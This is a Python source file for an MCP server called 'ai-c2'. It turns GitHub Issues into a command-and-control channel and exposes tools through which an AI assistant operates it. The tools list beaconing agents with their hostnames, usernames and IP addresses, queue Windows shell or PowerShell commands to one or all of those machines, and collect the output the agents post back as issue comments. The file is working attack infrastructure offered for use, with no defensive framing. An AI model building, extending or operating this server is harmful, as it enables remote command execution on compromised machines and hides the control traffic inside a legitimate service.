from mcp.server.fastmcp import FastMCP
import requests
import os
import json

mcp = FastMCP("ai-c2")

# ── Config (set these env vars or hardcode) ────────────────────────────────────
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")         
GITHUB_REPO  = os.environ.get("GITHUB_REPO",  "")         
TASK_LABEL   = "c2-task"
AGENT_LABEL  = "c2-agent"

HEADERS = {
    "Authorization": f"Bearer {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
}
BASE = f"https://api.github.com/repos/{GITHUB_REPO}"

# ── Internal helpers ───────────────────────────────────────────────────────────

def _ensure_labels():
    """Make sure the required labels exist in the repo."""
    for label, color, desc in [
        (TASK_LABEL,  "e11d48", "C2 task command"),
        (AGENT_LABEL, "0ea5e9", "C2 agent beacon"),
        ("c2-done",   "16a34a", "C2 task completed"),
    ]:
        requests.post(f"{BASE}/labels", headers=HEADERS, json={
            "name": label, "color": color, "description": desc
        })

def _create_issue(title: str, body: str, labels: list) -> dict:
    r = requests.post(f"{BASE}/issues", headers=HEADERS, json={
        "title": title, "body": body, "labels": labels
    }, timeout=15)
    r.raise_for_status()
    return r.json()

def _get_issue(issue_number: int) -> dict:
    r = requests.get(f"{BASE}/issues/{issue_number}", headers=HEADERS, timeout=15)
    r.raise_for_status()
    return r.json()

def _list_issues(label: str, state="open") -> list:
    r = requests.get(f"{BASE}/issues", headers=HEADERS, params={
        "labels": label, "state": state, "per_page": 50
    }, timeout=15)
    r.raise_for_status()
    return r.json()

def _get_comments(issue_number: int) -> list:
    r = requests.get(f"{BASE}/issues/{issue_number}/comments", headers=HEADERS, timeout=15)
    r.raise_for_status()
    return r.json()

def _close_issue(issue_number: int):
    """Close a GitHub issue (deactivates the agent/task)."""
    r = requests.patch(f"{BASE}/issues/{issue_number}", headers=HEADERS, json={
        "state": "closed"
    }, timeout=15)
    r.raise_for_status()
    return r.json()

# ── MCP Tools ──────────────────────────────────────────────────────────────────

@mcp.tool(
    name="list_agents",
    description=(
        "List all agents that have sent a beacon. "
        "Shows hostname, username, public and private IP, and when they last checked in."
    )
)
def list_agents() -> dict:
    """Show all connected/registered agents."""
    try:
        issues = _list_issues(AGENT_LABEL, state="open")
        agents = []
        for issue in issues:
            # Latest comment = most recent beacon
            comments = _get_comments(issue["number"])
            last_beacon = comments[-1]["body"] if comments else issue["body"]
            try:
                info = json.loads(last_beacon)
            except Exception:
                info = {"raw": last_beacon}
            agents.append({
                "agent_id":  issue["title"].replace("AGENT:", "").strip(),
                "issue_number": issue["number"],
                "last_seen": issue["updated_at"],
                **info,
            })
        return {"agents": agents, "count": len(agents)}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@mcp.tool(
    name="queue_task",
    description=(
        "Send a shell command to one or all connected agents. "
        "The 'command' should be a Windows shell/PowerShell command. "
        "Optionally specify 'agent_id' to target a specific machine; "
        "leave blank to send to ALL online agents. "
        "Returns a task_id (GitHub Issue number) to check results later."
    )
)
def queue_task(command: str, agent_id: str = None) -> dict:
    """Create a GitHub Issue as a task for the agent(s) to execute."""
    try:
        _ensure_labels()
        target = agent_id if agent_id else "ALL"
        title = f"TASK [{target}]: {command[:60]}"
        body = json.dumps({
            "command": command,
            "target_agent": agent_id,
        }, indent=2)
        issue = _create_issue(title, body, [TASK_LABEL])
        return {
            "status": "queued",
            "task_id": issue["number"],
            "url": issue["html_url"],
            "command": command,
            "target": target,
            "message": f"Task #{issue['number']} queued. Use get_task_result({issue['number']}) to fetch output.",
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


@mcp.tool(
    name="get_task_result",
    description=(
        "Get the output/result of a previously queued task by its task_id (GitHub Issue number). "
        "The result appears once the agent has executed the command and posted back."
    )
)
def get_task_result(task_id: int) -> dict:
    """Fetch the result of a task from GitHub Issue comments."""
    try:
        issue = _get_issue(task_id)
        comments = _get_comments(task_id)
        if not comments:
            return {
                "task_id": task_id,
                "status": "pending",
                "message": "No result yet — agent hasn't executed this task.",
                "issue_url": issue["html_url"],
            }
        results = []
        for c in comments:
            try:
                data = json.loads(c["body"])
                results.append(data)
            except Exception:
                results.append({"raw_output": c["body"], "posted_at": c["created_at"]})
        return {
            "task_id": task_id,
            "status": "completed" if results else "pending",
            "results": results,
            "issue_url": issue["html_url"],
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


@mcp.tool(
    name="list_tasks",
    description=(
        "List all pending or recently completed tasks. "
        "Use state='open' for pending, state='closed' for completed, state='all' for everything."
    )
)
def list_tasks(state: str = "all") -> dict:
    """List all C2 tasks from GitHub Issues."""
    try:
        if state == "all":
            open_issues   = _list_issues(TASK_LABEL, state="open")
            closed_issues = _list_issues(TASK_LABEL, state="closed")
            issues = open_issues + closed_issues
        else:
            issues = _list_issues(TASK_LABEL, state=state)
        tasks = []
        for issue in issues:
            try:
                body = json.loads(issue["body"])
            except Exception:
                body = {}
            tasks.append({
                "task_id":  issue["number"],
                "title":    issue["title"],
                "command":  body.get("command", ""),
                "target":   body.get("target_agent", "ALL"),
                "status":   "pending" if issue["state"] == "open" else "completed",
                "created":  issue["created_at"],
                "url":      issue["html_url"],
            })
        return {"tasks": tasks, "count": len(tasks)}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@mcp.tool(
    name="remove_agent",
    description="Deactivate and remove an agent from the list by its agent_id or issue_number."
)
def remove_agent(agent_id: str = None, issue_number: int = None) -> dict:
    """Close the GitHub Issue associated with a dead agent."""
    try:
        if issue_number:
            _close_issue(issue_number)
            return {"status": "success", "message": f"Agent (Issue #{issue_number}) removed."}
        
        if agent_id:
            # We need to find the issue number for this agent_id
            issues = _list_issues(AGENT_LABEL, state="open")
            for issue in issues:
                if issue["title"].replace("AGENT:", "").strip() == agent_id:
                    _close_issue(issue["number"])
                    return {"status": "success", "message": f"Agent {agent_id} removed."}
            return {"status": "error", "message": f"Agent ID {agent_id} not found."}
            
        return {"status": "error", "message": "Must provide agent_id or issue_number."}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@mcp.tool(
    name="cleanup_dead_agents",
    description="Automatically close agent issues that haven't checked in for more than X minutes (default 30)."
)
def cleanup_dead_agents(minutes: int = 30) -> dict:
    """Close all agent issues that have been inactive for the specified time."""
    from datetime import datetime, timedelta, timezone
    try:
        issues = _list_issues(AGENT_LABEL, state="open")
        threshold = datetime.now(timezone.utc) - timedelta(minutes=minutes)
        removed = []
        
        for issue in issues:
            updated_at = datetime.strptime(issue["updated_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
            if updated_at < threshold:
                _close_issue(issue["number"])
                removed.append({
                    "agent_id": issue["title"].replace("AGENT:", "").strip(),
                    "issue_number": issue["number"]
                })
        
        return {
            "status": "success",
            "removed_count": len(removed),
            "removed_agents": removed,
            "message": f"Cleaned up {len(removed)} inactive agents (threshold: {minutes} mins)."
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


if __name__ == "__main__":
    print("🚀 Starting ai-c2 MCP server (GitHub C2 mode)")
    print(f"   Repo: {GITHUB_REPO}")
    mcp.run()